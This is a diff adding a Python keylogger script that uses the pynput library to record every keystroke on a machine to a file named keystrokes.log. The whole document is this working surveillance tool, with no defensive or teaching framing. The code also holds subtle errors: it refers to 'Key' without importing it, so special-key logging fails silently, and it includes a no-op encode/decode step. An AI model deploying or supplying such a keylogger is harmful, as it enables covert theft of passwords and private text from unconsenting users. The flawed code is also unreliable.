@@ -1,0 +1,46 @@
+import logging
+import pynput.keyboard
+
+# Configure logging for better error handling and file encoding
+logging.basicConfig(filename='keystrokes.log', level=logging.INFO, format='%(asctime)s: %(message)s', encoding='utf-8')
+
+def write_to_log(key):
+    """Writes keystrokes to the log file, handling special keys and potential encoding issues."""
+    try:
+        if hasattr(key, 'char'):
+            # Encode character before writing (assuming UTF-8 encoding)
+            logging.info(key.char.encode('utf-8').decode('utf-8'))
+        elif key in {Key.space, Key.enter, Key.tab}:
+            # Handle basic special keys using a dictionary for efficiency
+            logging.info(str(key))
+        elif key in (Key.backspace, Key.delete, Key.esc, Key.caps_lock, Key.print_screen,
+                     Key.insert, Key.page_up, Key.page_down, Key.home, Key.end):
+            # Group common special keys for readability
+            logging.info(f'[{key.name}]')
+        elif key in (Key.up, Key.down, Key.left, Key.right):
+            # Group arrow keys for readability
+            logging.info(f'[{key.name.replace("_", " ")}]')  # Convert underscores to spaces for better readability
+        else:
+            logging.info(f'[UNKNOWN: {key}]')  # Log unknown keys for debugging purposes
+    except UnicodeEncodeError:  # Handle encoding errors gracefully
+        logging.error("Error encoding character, logging as '[UNSUPPORTED CHARACTER]'")
+        logging.info('[UNSUPPORTED CHARACTER]')
+    except Exception as e:  # Catch general exceptions for robustness
+        logging.error(f'Error writing keystroke: {e}')
+
+def on_press(key):
+    """Handles key press event and logs the key."""
+    write_to_log(key)
+
+def on_release(key):
+    """Handles key release event (currently unused)."""
+    if key == Key.esc:
+        # Optional: Implement logic to stop the listener if needed
+        return False
+
+# Start the listener with error handling
+try:
+    with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+except Exception as e:  # Catch general exceptions for listener startup errors
+    logging.error(f'Error starting listener: {e}')
